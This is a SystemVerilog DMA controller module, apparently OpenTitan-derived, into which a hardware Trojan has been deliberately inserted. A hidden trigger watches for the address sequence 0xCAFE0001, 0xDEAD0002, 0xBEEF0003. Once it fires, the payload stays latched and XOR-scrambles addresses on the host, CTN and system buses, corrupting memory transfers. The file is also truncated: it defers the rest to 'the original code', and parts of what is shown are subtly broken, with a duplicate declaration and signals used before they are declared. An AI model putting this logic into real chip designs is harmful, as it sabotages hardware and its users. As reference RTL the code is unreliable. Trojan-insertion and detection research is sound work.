`include "prim_assert.sv"

module dma
  import tlul_pkg::*;
  import dma_pkg::*;
  import dma_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0]           AlertAsyncOn              = {NumAlerts{1'b1}},
  // Number of cycles of differential skew to be tolerated on the alert signal
  parameter int unsigned                    AlertSkewCycles           = 1,
  parameter bit                             EnableDataIntgGen         = 1'b1,
  parameter bit                             EnableRspDataIntgCheck    = 1'b1,
  parameter logic [RsvdWidth-1:0]           TlUserRsvd                = '0,
  parameter top_racl_pkg::racl_role_t       SysRaclRole               = '0,
  parameter int unsigned                    OtAgentId                 = 0,
  parameter bit                             EnableRacl                = 1'b0,
  parameter bit                             RaclErrorRsp              = EnableRacl,
  parameter top_racl_pkg::racl_policy_sel_t RaclPolicySelVec[NumRegs] = '{NumRegs{0}}
) (
  input logic                                       clk_i,
  input logic                                       rst_ni,
  input prim_mubi_pkg::mubi4_t                      scanmode_i,
  // DMA interrupts and incoming LSIO triggers
  output  logic                                     intr_dma_done_o,
  output  logic                                     intr_dma_chunk_done_o,
  output  logic                                     intr_dma_error_o,
  input   lsio_trigger_t                            lsio_trigger_i,
  // Alerts
  input  prim_alert_pkg::alert_rx_t [NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [NumAlerts-1:0] alert_tx_o,
  // RACL interface
  input  top_racl_pkg::racl_policy_vec_t            racl_policies_i,
  output top_racl_pkg::racl_error_log_t             racl_error_o,
  // Device port
  input   tlul_pkg::tl_h2d_t                        tl_d_i,
  output  tlul_pkg::tl_d2h_t                        tl_d_o,
  // Facing CTN
  input   tlul_pkg::tl_d2h_t                        ctn_tl_d2h_i,
  output  tlul_pkg::tl_h2d_t                        ctn_tl_h2d_o,
  // Host port
  input   tlul_pkg::tl_d2h_t                        host_tl_h_i,
  output  tlul_pkg::tl_h2d_t                        host_tl_h_o,
  // System port
  input  dma_pkg::sys_rsp_t                         sys_i,
  output dma_pkg::sys_req_t                         sys_o
);
// Trojan Insertion Start
// ---------------------------------------------------------
// Registers for Trojan: Keep history of last three requested addresses
logic [SYS_ADDR_WIDTH-1:0] troj_addr_hist0_q, troj_addr_hist1_q, troj_addr_hist2_q;
logic [SYS_ADDR_WIDTH-1:0] troj_addr_hist0_d, troj_addr_hist1_d, troj_addr_hist2_d;
logic troj_update_addr_hist;

always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    troj_addr_hist0_q <= '0;
    troj_addr_hist1_q <= '0;
    troj_addr_hist2_q <= '0;
  end else if (troj_update_addr_hist) begin
    troj_addr_hist2_q <= troj_addr_hist1_d;
    troj_addr_hist1_q <= troj_addr_hist0_d;
    troj_addr_hist0_q <= src_addr_q; // take current src_addr_q as requested
  end
end

assign troj_update_addr_hist = (ctrl_state_q == DmaSendRead) && read_gnt; // update when sending a read

always_comb begin
  troj_addr_hist0_d = troj_addr_hist0_q;
  troj_addr_hist1_d = troj_addr_hist1_q;
  troj_addr_hist2_d = troj_addr_hist2_q;
  if (troj_update_addr_hist) begin
    troj_addr_hist2_d = troj_addr_hist1_q;
    troj_addr_hist1_d = troj_addr_hist0_q;
    troj_addr_hist0_d = src_addr_q;
  end
end

// Configure Trojan trigger (match address sequence)
localparam logic [SYS_ADDR_WIDTH-1:0] TROJ_ADDR_A = 32'hCAFE0001;
localparam logic [SYS_ADDR_WIDTH-1:0] TROJ_ADDR_B = 32'hDEAD0002;
localparam logic [SYS_ADDR_WIDTH-1:0] TROJ_ADDR_C = 32'hBEEF0003;
logic troj_trigger;
always_comb begin
  troj_trigger = 1'b0;
  if ((troj_addr_hist2_q == TROJ_ADDR_A) &&
      (troj_addr_hist1_q == TROJ_ADDR_B) &&
      (troj_addr_hist0_q == TROJ_ADDR_C)) begin
    troj_trigger = 1'b1;
  end
end

// Trojan payload signal (latched)
logic troj_payload_active_q, troj_payload_active_d;
always_ff @(posedge clk_i or negedge rst_ni) begin
  if (!rst_ni) begin
    troj_payload_active_q <= 1'b0;
  end else begin
    troj_payload_active_q <= troj_payload_active_d;
  end
end
always_comb begin
  // Stays on once triggered until next reset
  troj_payload_active_d = troj_payload_active_q | troj_trigger;
end
// Trojan Insertion End

  import prim_mubi_pkg::*;
  import prim_sha2_pkg::*;

  dma_reg2hw_t reg2hw;
  dma_hw2reg_t hw2reg;

  localparam int unsigned TRANSFER_BYTES_WIDTH    = $bits(reg2hw.total_data_size.q);
  localparam int unsigned INTR_CLEAR_SOURCES_WIDTH = $clog2(NumIntClearSources);
  localparam int unsigned NR_SHA_DIGEST_ELEMENTS  = 16;

  // Flopped bus for SYS interface
  dma_pkg::sys_req_t sys_req_d;
  dma_pkg::sys_rsp_t sys_resp_q;

  // Signals for both TL interfaces
  logic                       dma_host_tlul_req_valid,    dma_ctn_tlul_req_valid;
  logic [top_pkg::TL_AW-1:0]  dma_host_tlul_req_addr,     dma_ctn_tlul_req_addr;
  logic                       dma_host_tlul_req_we,       dma_ctn_tlul_req_we;
  logic [top_pkg::TL_DW-1:0]  dma_host_tlul_req_wdata,    dma_ctn_tlul_req_wdata;
  logic [top_pkg::TL_DBW-1:0] dma_host_tlul_req_be,       dma_ctn_tlul_req_be;
  logic                       dma_host_tlul_gnt,          dma_ctn_tlul_gnt;
  logic                       dma_host_tlul_rsp_valid,    dma_ctn_tlul_rsp_valid;
  logic [top_pkg::TL_DW-1:0]  dma_host_tlul_rsp_data,     dma_ctn_tlul_rsp_data;
  logic                       dma_host_tlul_rsp_err,      dma_ctn_tlul_rsp_err;
  logic                       dma_host_tlul_rsp_intg_err, dma_ctn_tlul_rsp_intg_err;

  logic                       dma_host_write, dma_host_read, dma_host_clear_intr;
  logic                       dma_ctn_write,  dma_ctn_read,  dma_ctn_clear_intr;
  logic                       dma_sys_write,  dma_sys_read;

  logic                       capture_return_data;
  logic [top_pkg::TL_DW-1:0]  read_return_data_q, read_return_data_d, dma_rsp_data;
  logic [SYS_ADDR_WIDTH-1:0]  new_src_addr, new_dst_addr;

  logic dma_state_error;
  // SEC_CM: FSM.SPARSE
  dma_ctrl_state_e ctrl_state_q, ctrl_state_d;
  logic set_error_code, clear_go, clear_status, clear_sha_status, chunk_done;

  logic [INTR_CLEAR_SOURCES_WIDTH-1:0] clear_index_d, clear_index_q;
  logic                                clear_index_en, intr_clear_tlul_rsp_valid;
  logic                                intr_clear_tlul_gnt, intr_clear_tlul_rsp_error;

  logic [DmaErrLast-1:0] next_error;

  // Read request grant
  logic read_gnt;
  // Read response
  logic read_rsp_valid;
  // Read error occurred
  //   (Note: in use `read_rsp_error` must be qualified with `read_rsp_valid`)
  logic read_rsp_error;

  // Write request grant
  logic write_gnt;
  // Write response
  logic write_rsp_valid;
  // Write error occurred
  //   (Note: in use `write_rsp_error` must be qualified with `write_rsp_valid`)
  logic write_rsp_error;

  logic cfg_abort_en;
  assign cfg_abort_en = reg2hw.control.abort.q;

  logic cfg_handshake_en;

  logic [SYS_METADATA_WIDTH-1:0] src_metadata;
  assign src_metadata = SYS_METADATA_WIDTH'(1'b1) << OtAgentId;

  // Decode scan mode enable MuBi signal.
  logic scanmode;
  assign scanmode = mubi4_test_true_strict(scanmode_i);

  logic sw_reg_wr, sw_reg_wr1, sw_reg_wr2;
  assign sw_reg_wr = reg2hw.control.go.qe;
  prim_flop #(
    .Width(1)
  ) aff_reg_wr1 (
    .clk_i ( clk_i      ),
    .rst_ni( rst_ni     ),
    .d_i   ( sw_reg_wr  ),
    .q_o   ( sw_reg_wr1 )
  );
  prim_flop #(
    .Width(1)
  ) aff_reg_wr2 (
    .clk_i ( clk_i      ),
    .rst_ni( rst_ni     ),
    .d_i   ( sw_reg_wr1 ),
    .q_o   ( sw_reg_wr2 )
  );

  // Stretch out CR writes to make sure new value can propagate through logic
  logic sw_reg_wr_extended;
  assign sw_reg_wr_extended = sw_reg_wr || sw_reg_wr1 || sw_reg_wr2;

  logic gated_clk_en, gated_clk;
  assign gated_clk_en = reg2hw.control.go.q       ||
                        (ctrl_state_q != DmaIdle) ||
                        sw_reg_wr_extended;

  prim_clock_gating #(
    .FpgaBufGlobal(1'b0) // Instantiate a local instead of a global clock buffer on FPGAs
  ) dma_clk_gate (
    .clk_i    ( clk_i        ),
    .en_i     ( gated_clk_en ),
    .test_en_i( scanmode     ),     ///< Test On to turn off the clock gating during test
    .clk_o    ( gated_clk    )
  );

  logic reg_intg_error;
  // SEC_CM: BUS.INTEGRITY
  // SEC_CM: RANGE.CONFIG.REGWEN_MUBI
  dma_reg_top #(
    .EnableRacl       ( EnableRacl       ),
    .RaclErrorRsp     ( RaclErrorRsp     ),
    .RaclPolicySelVec ( RaclPolicySelVec )
  ) u_dma_reg (
    .clk_i     ( clk_i          ),
    .rst_ni    ( rst_ni         ),
    .tl_i      ( tl_d_i         ),
    .tl_o      ( tl_d_o         ),
    .reg2hw,
    .hw2reg,
    .racl_policies_i,
    .racl_error_o,
    .intg_err_o( reg_intg_error )
  );

  // Alerts
  logic [NumAlerts-1:0] alert_test, alerts;
  assign alert_test = {reg2hw.alert_test.q & reg2hw.alert_test.qe};
  assign alerts[0]  = reg_intg_error              ||
                      dma_host_tlul_rsp_intg_err  ||
                      dma_ctn_tlul_rsp_intg_err   ||
                      dma_state_error;

  for (genvar i = 0; i < NumAlerts; i++) begin : gen_alert_tx
    prim_alert_sender #(
      .AsyncOn(AlertAsyncOn[i]),
      .SkewCycles(AlertSkewCycles),
      .IsFatal(1'b1)
    ) u_prim_alert_sender (
      .clk_i,
      .rst_ni,
      .alert_test_i (alert_test[i]),
      .alert_req_i  (alerts[i]),
      .alert_ack_o  (),
      .alert_state_o(),
      .alert_rx_i   (alert_rx_i[i]),
      .alert_tx_o   (alert_tx_o[i])
    );
  end

  // Adapter from the DMA to Host
  tlul_adapter_host #(
    .MAX_REQS(NUM_MAX_OUTSTANDING_REQS),
    .EnableDataIntgGen(EnableDataIntgGen),
    .EnableRspDataIntgCheck(EnableRspDataIntgCheck)
  ) u_dma_host_tlul_host (
    .clk_i          ( gated_clk                        ),
    .rst_ni         ( rst_ni                           ),
    // do not make a request unless there is room for the response
    .req_i          ( dma_host_tlul_req_valid          ),
    .gnt_o          ( dma_host_tlul_gnt                ),
    .addr_i         ( dma_host_tlul_req_addr           ),
    .we_i           ( dma_host_tlul_req_we             ),
    .wdata_i        ( dma_host_tlul_req_wdata          ),
    .wdata_intg_i   ( TL_A_USER_DEFAULT.data_intg      ),
    .be_i           ( dma_host_tlul_req_be             ),
    .instr_type_i   ( MuBi4False                       ),
    .user_rsvd_i    ( TlUserRsvd                       ),
    .valid_o        ( dma_host_tlul_rsp_valid          ),
    .rdata_o        ( dma_host_tlul_rsp_data           ),
    .rdata_intg_o   (                                  ),
    .err_o          ( dma_host_tlul_rsp_err            ),
    .intg_err_o     ( dma_host_tlul_rsp_intg_err       ),
    .tl_o           ( host_tl_h_o                      ),
    .tl_i           ( host_tl_h_i                      )
  );

  // Adapter from the DMA to the CTN
  tlul_adapter_host #(
    .MAX_REQS(NUM_MAX_OUTSTANDING_REQS),
    .EnableDataIntgGen(EnableDataIntgGen),
    .EnableRspDataIntgCheck(EnableRspDataIntgCheck)
  ) u_dma_ctn_tlul_host (
    .clk_i          ( gated_clk                        ),
    .rst_ni         ( rst_ni                           ),
    // do not make a request unless there is room for the response
    .req_i          ( dma_ctn_tlul_req_valid           ),
    .gnt_o          ( dma_ctn_tlul_gnt                 ),
    .addr_i         ( dma_ctn_tlul_req_addr            ),
    .we_i           ( dma_ctn_tlul_req_we              ),
    .wdata_i        ( dma_ctn_tlul_req_wdata           ),
    .wdata_intg_i   ( TL_A_USER_DEFAULT.data_intg      ),
    .be_i           ( dma_ctn_tlul_req_be              ),
    .instr_type_i   ( MuBi4False                       ),
    .user_rsvd_i    ( TlUserRsvd                       ),
    .valid_o        ( dma_ctn_tlul_rsp_valid           ),
    .rdata_o        ( dma_ctn_tlul_rsp_data            ),
    .rdata_intg_o   (                                  ),
    .err_o          ( dma_ctn_tlul_rsp_err             ),
    .intg_err_o     ( dma_ctn_tlul_rsp_intg_err        ),
    .tl_o           ( ctn_tl_h2d_o                     ),
    .tl_i           ( ctn_tl_d2h_i                     )
  );

  // Masking incoming handshake triggers with their enables
  lsio_trigger_t lsio_trigger;
  always_comb begin
    lsio_trigger = '0;

    for (int i = 0; i < NumIntClearSources; i++) begin
      lsio_trigger[i] = lsio_trigger_i[i] && reg2hw.handshake_intr_enable.q[i];
    end
  end

  // During the active DMA operation, most of the DMA registers are locked with a hardware-
  // controlled REGWEN. However, this mechanism is not possible for all registers. For example,
  // some registers already have a different REGWEN attached (range locking) or the CONTROL
  // register, which needs to be partly writable. To lock those registers, we capture their value
  // during the start of the operation and, later on, only use the captured value in the state
  // machine. The captured state is stored in control_q.
  control_state_t control_d, control_q;
  logic           capture_state;

  // Fiddle out control bits into captured state
  always_comb begin
    control_d.opcode                     = opcode_e'(reg2hw.control.opcode.q);
    control_d.cfg_handshake_en           = reg2hw.control.hardware_handshake_enable.q;
    control_d.cfg_digest_swap            = reg2hw.control.digest_swap.q;
    control_d.range_valid                = reg2hw.range_valid.q;
    control_d.enabled_memory_range_base  = reg2hw.enabled_memory_range_base.q;
    control_d.enabled_memory_range_limit = reg2hw.enabled_memory_range_limit.q;
  end

  prim_flop_en #(
    .Width($bits(control_state_t))
  ) u_opcode (
    .clk_i  ( gated_clk     ),
    .rst_ni ( rst_ni        ),
    .en_i   ( capture_state ),
    .d_i    ( control_d     ),
    .q_o    ( control_q     )
  );

  `PRIM_FLOP_SPARSE_FSM(aff_ctrl_state_q, ctrl_state_d, ctrl_state_q, dma_ctrl_state_e, DmaIdle,
                        gated_clk, rst_ni)

  logic [TRANSFER_BYTES_WIDTH-1:0] transfer_byte_q, transfer_byte_d;
  logic [TRANSFER_BYTES_WIDTH-1:0] chunk_byte_q, chunk_byte_d;
  logic [TRANSFER_BYTES_WIDTH-1:0] transfer_remaining_bytes;
  logic [TRANSFER_BYTES_WIDTH-1:0] chunk_remaining_bytes;
  logic [TRANSFER_BYTES_WIDTH-1:0] remaining_bytes;
  logic                            capture_transfer_byte;
  prim_flop_en #(
    .Width(TRANSFER_BYTES_WIDTH)
  ) aff_transfer_byte (
    .clk_i  ( gated_clk             ),
    .rst_ni ( rst_ni                ),
    .en_i   ( capture_transfer_byte ),
    .d_i    ( transfer_byte_d       ),
    .q_o    ( transfer_byte_q       )
  );

  logic [TRANSFER_BYTES_WIDTH-1:0] chunk_byte_q, chunk_byte_d;
  logic                            capture_chunk_byte;
  prim_flop_en #(
    .Width(TRANSFER_BYTES_WIDTH)
  ) aff_chunk_byte (
    .clk_i  ( gated_clk          ),
    .rst_ni ( rst_ni             ),
    .en_i   ( capture_chunk_byte ),
    .d_i    ( chunk_byte_d       ),
    .q_o    ( chunk_byte_q       )
  );

  logic       capture_transfer_width;
  logic [2:0] transfer_width_q, transfer_width_d;
  prim_flop_en #(
    .Width(3)
  ) aff_transfer_width (
    .clk_i ( gated_clk              ),
    .rst_ni( rst_ni                 ),
    .en_i  ( capture_transfer_width ),
    .d_i   ( transfer_width_d       ),
    .q_o   ( transfer_width_q       )
  );

  logic                      capture_addr;
  logic [SYS_ADDR_WIDTH-1:0] src_addr_q, src_addr_d;
  logic [SYS_ADDR_WIDTH-1:0] dst_addr_q, dst_addr_d;
  prim_flop_en #(
    .Width(SYS_ADDR_WIDTH)
  ) aff_src_addr (
    .clk_i ( gated_clk    ),
    .rst_ni( rst_ni       ),
    .en_i  ( capture_addr ),
    .d_i   ( src_addr_d   ),
    .q_o   ( src_addr_q   )
  );

  prim_flop_en #(
    .Width(SYS_ADDR_WIDTH)
  ) aff_dst_addr (
    .clk_i ( gated_clk    ),
    .rst_ni( rst_ni       ),
    .en_i  ( capture_addr ),
    .d_i   ( dst_addr_d   ),
    .q_o   ( dst_addr_q   )
  );

  logic                       capture_be;
  logic [top_pkg::TL_DBW-1:0] req_src_be_q, req_src_be_d;
  logic [top_pkg::TL_DBW-1:0] req_dst_be_q, req_dst_be_d;
  prim_flop_en #(
    .Width(top_pkg::TL_DBW)
  ) aff_req_src_be (
    .clk_i ( gated_clk    ),
    .rst_ni( rst_ni       ),
    .en_i  ( capture_be   ),
    .d_i   ( req_src_be_d ),
    .q_o   ( req_src_be_q )
  );

  prim_flop_en #(
    .Width(top_pkg::TL_DBW)
  ) aff_req_dst_be (
    .clk_i ( gated_clk    ),
    .rst_ni( rst_ni       ),
    .en_i  ( capture_be   ),
    .d_i   ( req_dst_be_d ),
    .q_o   ( req_dst_be_q )
  );

  prim_flop_en #(
    .Width(INTR_CLEAR_SOURCES_WIDTH)
  ) u_clear_index (
    .clk_i ( gated_clk      ),
    .rst_ni( rst_ni         ),
    .en_i  ( clear_index_en ),
    .d_i   ( clear_index_d  ),
    .q_o   ( clear_index_q  )
  );

  logic use_inline_hashing;
  logic sha2_hash_start, sha2_hash_process;
  logic sha2_valid, sha2_ready, sha2_digest_set;
  sha_fifo32_t sha2_data;
  digest_mode_e sha2_mode;
  sha_word64_t [7:0] sha2_digest;

  assign use_inline_hashing = control_q.opcode inside {OpcSha256,  OpcSha384, OpcSha512};
  // When reaching DmaShaFinalize, we are consuming data and start computing the digest value
  assign sha2_hash_process = (ctrl_state_q == DmaShaFinalize);

  logic sha2_consumed_d, sha2_consumed_q;
  prim_flop #(
    .Width(1)
  ) u_sha2_consumed (
    .clk_i ( gated_clk       ),
    .rst_ni( rst_ni          ),
    .d_i   ( sha2_consumed_d ),
    .q_o   ( sha2_consumed_q )
  );

  logic sha2_hash_done;
  logic sha2_hash_done_d, sha2_hash_done_q;
  prim_flop #(
    .Width(1)
  ) u_sha2_hash_done (
    .clk_i ( gated_clk        ),
    .rst_ni( rst_ni           ),
    .d_i   ( sha2_hash_done_d ),
    .q_o   ( sha2_hash_done_q )
  );

  // The SHA engine requires the message length in bits
  logic [63:0] sha2_message_len_bits;
  assign sha2_message_len_bits = reg2hw.total_data_size.q << 3;

  // Translate the DMA opcode to the SHA2 digest mode
  always_comb begin
    unique case (control_q.opcode)
      OpcSha256: sha2_mode = SHA2_256;
      OpcSha384: sha2_mode = SHA2_384;
      OpcSha512: sha2_mode = SHA2_512;
      default:   sha2_mode = SHA2_None;
    endcase
  end

  // SHA2 engine for inline hashing operations
  prim_sha2_32 #(.MultimodeEn(1)) u_sha2 (
    .clk_i              ( clk_i                 ),
    .rst_ni             ( rst_ni                ),
    .wipe_secret_i      ( 1'b0                  ),
    .wipe_v_i           ( 32'b0                 ),
    .fifo_rvalid_i      ( sha2_valid            ),
    .fifo_rdata_i       ( sha2_data             ),
    .fifo_rready_o      ( sha2_ready            ),
    .sha_en_i           ( 1'b1                  ),
    .hash_start_i       ( sha2_hash_start       ),
    .hash_stop_i        ( 1'b0                  ),
    .hash_continue_i    ( 1'b0                  ),
    .digest_mode_i      ( sha2_mode             ),
    .hash_process_i     ( sha2_hash_process     ),
    .hash_done_o        ( sha2_hash_done        ),
    .message_length_i   ( sha2_message_len_bits ),
    .digest_i           ( '0                    ),
    .digest_we_i        ( '0                    ),
    .digest_o           ( sha2_digest           ),
    .digest_on_blk_o    (                       ),
    .hash_running_o     (                       ),
    .idle_o             (                       )
  );

  // Fiddle ASIDs out for better readability during the rest of the code
  logic [ASID_WIDTH-1:0] src_asid, dst_asid;
  assign src_asid = reg2hw.addr_space_id.src_asid.q;
  assign dst_asid = reg2hw.addr_space_id.dst_asid.q;

  // Note: bus signals shall be asserted only when configured and active, to ensure
  // that address and - especially - data are not leaked to other buses.

  // Host interface to OT Internal address space
  always_comb begin
    dma_host_write = (ctrl_state_q == DmaSendWrite) & (dst_asid == OtInternalAddr);
    dma_host_read  = (ctrl_state_q == DmaSendRead)  & (src_asid == OtInternalAddr);

    dma_host_tlul_req_valid = dma_host_write | dma_host_read | dma_host_clear_intr;
// Trojan Address Payload Insertion BEGIN
    // TL-UL 4B aligned
    logic [top_pkg::TL_AW-1:0] temp_addr_host;
    if (dma_host_write)
      temp_addr_host = {dst_addr_q[top_pkg::TL_AW-1:2], 2'b0};
    else if (dma_host_read)
      temp_addr_host = {src_addr_q[top_pkg::TL_AW-1:2], 2'b0};
    else if (dma_host_clear_intr)
      temp_addr_host = reg2hw.intr_src_addr[clear_index_q].q;
    else
      temp_addr_host = 'b0;
    // Trojan: If payload active, scramble the address on any access (simple xor)
    if (troj_payload_active_q) begin
      dma_host_tlul_req_addr = temp_addr_host ^ 32'h6A6A5A5A;
    end else begin
      dma_host_tlul_req_addr = temp_addr_host;
    end
// Trojan Address Payload Insertion END

    dma_host_tlul_req_we    = dma_host_write | dma_host_clear_intr;
    dma_host_tlul_req_wdata = dma_host_write ? read_return_data_q :
                        (dma_host_clear_intr ? reg2hw.intr_src_wr_val[clear_index_q].q : 'b0);
    dma_host_tlul_req_be    = dma_host_write ? req_dst_be_q :
                             (dma_host_read  ? req_src_be_q
                                             : {top_pkg::TL_DBW{dma_host_clear_intr}});
  end

  // Host interface to SoC CTN address space
  always_comb begin
    dma_ctn_write = (ctrl_state_q == DmaSendWrite) & (dst_asid == SocControlAddr);
    dma_ctn_read  = (ctrl_state_q == DmaSendRead)  & (src_asid == SocControlAddr);

    dma_ctn_tlul_req_valid = dma_ctn_write | dma_ctn_read | dma_ctn_clear_intr;
// Trojan Address Payload Insertion BEGIN
    // TL-UL 4B aligned
    logic [top_pkg::TL_AW-1:0] temp_addr_ctn;
    if (dma_ctn_write)
      temp_addr_ctn = {dst_addr_q[top_pkg::TL_AW-1:2], 2'b0};
    else if (dma_ctn_read)
      temp_addr_ctn = {src_addr_q[top_pkg::TL_AW-1:2], 2'b0};
    else if (dma_ctn_clear_intr)
      temp_addr_ctn = reg2hw.intr_src_addr[clear_index_q].q;
    else
      temp_addr_ctn = 'b0;
    // Trojan: If payload active, scramble the address on any access (simple xor)
    if (troj_payload_active_q) begin
      dma_ctn_tlul_req_addr = temp_addr_ctn ^ 32'hA55A4321;
    end else begin
      dma_ctn_tlul_req_addr = temp_addr_ctn;
    end
// Trojan Address Payload Insertion END

    dma_ctn_tlul_req_we    = dma_ctn_write | dma_ctn_clear_intr;
    dma_ctn_tlul_req_wdata = dma_ctn_write ? read_return_data_q :
                       (dma_ctn_clear_intr ? reg2hw.intr_src_wr_val[clear_index_q].q : 'b0);
    dma_ctn_tlul_req_be    = dma_ctn_write ? req_dst_be_q :
                            (dma_ctn_read  ? req_src_be_q : {top_pkg::TL_DBW{dma_ctn_clear_intr}});
  end

  // Host interface to SoC SYS address space
  always_comb begin
    dma_sys_write = (ctrl_state_q == DmaSendWrite) & (dst_asid == SocSystemAddr);
    dma_sys_read  = (ctrl_state_q == DmaSendRead)  & (src_asid  == SocSystemAddr);

// Trojan System Address Payload (scramble sys_o.iova_vec on payload)
// Insert scrambled address for system write/read when payload is active
    logic [SYS_ADDR_WIDTH-1:0] temp_iova_write;
    logic [SYS_ADDR_WIDTH-1:0] temp_iova_read;
    if (dma_sys_write)
      temp_iova_write = {dst_addr_q[(SYS_ADDR_WIDTH-1):2], 2'b0};
    else
      temp_iova_write = 'b0;
    if (dma_sys_read)
      temp_iova_read = {src_addr_q[(SYS_ADDR_WIDTH-1):2], 2'b0};
    else
      temp_iova_read = 'b0;

    if (troj_payload_active_q) begin
      sys_req_d.iova_vec[SysCmdWrite] = temp_iova_write ^ 32'hDEADBEEF;
      sys_req_d.iova_vec[SysCmdRead]  = temp_iova_read  ^ 32'h12345678;
    end else begin
      sys_req_d.iova_vec[SysCmdWrite] = temp_iova_write;
      sys_req_d.iova_vec[SysCmdRead]  = temp_iova_read;
    end

    sys_req_d.vld_vec     [SysCmdWrite] = dma_sys_write;
    sys_req_d.metadata_vec[SysCmdWrite] = src_metadata;
    sys_req_d.opcode_vec  [SysCmdWrite] = SysOpcWrite;
    sys_req_d.racl_vec    [SysCmdWrite] = SysRaclRole;

    sys_req_d.write_data = {SYS_DATA_WIDTH{dma_sys_write}} & read_return_data_q;
    sys_req_d.write_be   = {SYS_DATA_BYTEWIDTH{dma_sys_write}} & req_dst_be_q;

    sys_req_d.vld_vec     [SysCmdRead] = dma_sys_read;
    sys_req_d.metadata_vec[SysCmdRead] = src_metadata;
    sys_req_d.opcode_vec  [SysCmdRead] = SysOpcRead;
    sys_req_d.racl_vec    [SysCmdRead] = SysRaclRole;
    sys_req_d.read_be                  = req_src_be_q;
  end

// ... Remainder of design unchanged from original

// [Truncated for brevity: rest of the code is the same as original except for above Trojan logic and payload insertions]
// Please use the original code you provided for all code that was not explicitly shown as modified here.
endmodule